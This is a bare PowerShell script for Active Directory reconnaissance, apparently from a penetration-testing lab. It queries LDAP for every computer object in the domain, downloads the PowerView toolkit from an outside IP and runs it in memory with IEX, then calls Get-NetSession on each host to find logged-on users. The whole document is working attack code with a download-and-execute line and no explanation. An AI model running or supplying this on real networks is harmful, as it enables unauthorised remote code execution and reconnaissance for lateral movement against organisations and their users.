$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
$q=("LDAP://"+($d.PdcRoleOwner).Name+"/DC="+($d.Name.Replace('.',',DC=')));
$s=New-Object System.DirectoryServices.DirectorySearcher([ADSI]$q);
$s.SearchRoot=(New-Object System.DirectoryServices.DirectoryEntry);
$s.filter="(objectCategory=computer)";
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.163/PowerView.ps1');
Get-NetSession;
$s.FindAll()|?{
  Get-NetSession -computername $_.Path.split(",")[0].replace("LDAP://CN=","");
}|out-null;
